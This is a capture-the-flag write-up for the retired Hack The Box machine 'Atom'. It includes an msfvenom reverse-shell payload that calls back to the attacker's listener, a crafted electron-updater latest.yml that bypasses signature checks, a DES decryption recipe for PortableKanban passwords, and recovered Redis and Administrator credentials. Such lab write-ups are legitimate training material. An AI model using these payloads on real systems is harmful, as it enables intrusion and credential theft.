# Atom

This is the write-up for the box Atom that got retired at the 10th July 2021.
My IP address was 10.10.14.3 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.237    atom.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/atom.nmap 10.10.10.237
```

```
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Heed Solutions                                                                      
445/tcp open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The web services on HTTP (port 80) and HTTPS (port 443) forward to the same website.

## Checking SMB (Port 445)

Enumerating the SMB shares:
```
smbclient -N -L //10.10.10.237
```

There is a share called _Software_Updates_ with three empty directories and a PDF file:
```
smbclient -N //10.10.10.237/Software_Updates
```
```
smb: \> dir
  .                                   D        0  Sat May 28 15:47:34 2022
  ..                                  D        0  Sat May 28 15:47:34 2022
  client1                             D        0  Sat May 28 15:47:34 2022
  client2                             D        0  Sat May 28 15:47:34 2022
  client3                             D        0  Sat May 28 15:47:34 2022
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 13:18:08 2021

                4413951 blocks of size 4096. 1371473 blocks available

smb: \> get UAT_Testing_Procedures.pdf
```

The PDF document has the title _"Heedv1.0 - Internal QA Documentation"_ and explains something about an application.

Summary of document:
- Note taking application built with electron-builder which helps users in taking important notes.
- There’s no server interaction when creating notes.
- To initiate the QA process, just place the updates in one of the "client" folders, and the appropriate QA team will test it to ensure it finds an update and installs it correctly.

## Checking HTTP (Port 80)

On the website its introducing _A Simple Note Taking Application_ that can be downloaded by clicking on the _"Download for Windows"_ button.
It is a ZIP archive that has to be decompressed:
```
unzip heed_setup_v1.0.0.zip
```

It contains an executable file for Windows and as described in the PDF file, this application is built with [Electron-builder](https://www.electron.build/).
```
file 'heedv1 Setup 1.0.0.exe'

heedv1 Setup 1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
```

This is an self-extracting archive that can be decompressed with any archive manager to extract all contained files.
In there is a **7z archive** that also has to be extracted:
```
7z x app-64.7z
```

It extracts several folders, DLL files and more that can be analyzed to search for secrets or other sensitive information.
The file _resources/app-update.yml_ shows the URL of the update server:
```
url: 'http://updates.atom.htb'
```

After adding this hostname to our _/etc/hosts_ file, the hostname can be reached but it hosts the same website as before.

The file _resources/app.asar_ is an [Electron Archive](https://github.com/electron/asar) that can be decompressed with the **asar** command:
```
asar e app.asar .
```

The file _main.js_ shows that it uses the _electron-updater_ module.
This module is vulnerable to a **Remote Code Execution** vulnerability that is described in the the [blog of Doyensec](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html).

Creating malicious binary to execute with **Msfvenom**:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=9001 -f exe -o shell.exe
```
```
sha512sum shell.exe | awk '{print $1}' | xxd -r -p | base64 -w 0
```

Creating malicious update definition as described in the blog article with the hash of _shell.exe_:
```yml
version: 1.2.3
files:
  - url: s'hell.exe
    sha512: XUNa1lRdQ4KIrrFh1pavUWxZTbQrE9IWPM2VG6/52TilmBmWMm2+fA5MZjYMowmOaktkSkzcRVEszq54PRlcvQ==
    size: 7168
path: s'hell.exe
sha512: XUNa1lRdQ4KIrrFh1pavUWxZTbQrE9IWPM2VG6/52TilmBmWMm2+fA5MZjYMowmOaktkSkzcRVEszq54PRlcvQ==
releaseDate: '2021-11-20T11:17:02.627Z'
```

Uploading _latest.yml_ and _shell.exe_ into the SMB share as described in the PDF document:
```
smb: \> cd client1

smb: \client1\> put latest.yml
putting file latest.yml as \client1\latest.yml

smb: \client1\> put shell.exe s'hell.exe
putting file shell.exe as \client1\s'hell.exe
```

After a while, the Heed application calls the YML file for updates, which executes _shell.exe_ and the listener on my IP and port 9001 starts a reverse shell as the user _jason_.

## Privilege Escalation

In the home folder of _jason_ in the folder _Downloads\PortableKanban_ is the application _PortableKanban.exe_ and the corresponding configuration files.
The file _PortableKanban.cfg_ has information about a **Redis database** on port 6379 and an encrypted password:
```
{"DataSource":"RedisServer",
"DbServer":"localhost",
"DbPort":6379,
"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb",
(...)
```

Scanning port 6379 to check if it is accessible remotely:
```
nmap -p 6379 10.10.10.237
```
```
PORT     STATE SERVICE
6379/tcp open  redis
```

This application uses a [static key and initialization vector](https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py) and can be decrypted with several scripts.
Here is the [Recipe for CyberChef](https://cyberchef.org/):
```
From_Base64('A-Za-z0-9+/=',true)
DES_Decrypt({'option':'UTF8','string':'7ly6UznJ'},{'option':'UTF8','string':'XuVUm5fR'},'CBC','Raw','Raw')
```

Login into the **Redis** service:
```
redis-cli -h 10.10.10.237

10.10.10.237:6379> auth kidvscat_yes_kidvscat
```

Enumerating users and keys:
```
10.10.10.237:6379> keys *

1) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
2) "pk:ids:User"
3) "pk:ids:MetaDataClass"
4) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
```
```
10.10.10.237:6379> get "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"

"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"
```

There is a user _Administrator_ with an encrypted password, which can be cracked with the same **CyberChef recipe** as before.

Using **Evil-WinRM** to login to the box as _Administrator_:
```
evil-winrm -i 10.10.10.237 -u Administrator -p kidvscat_admin_@123
```

The password works and it spawns a shell as _Administrator_!
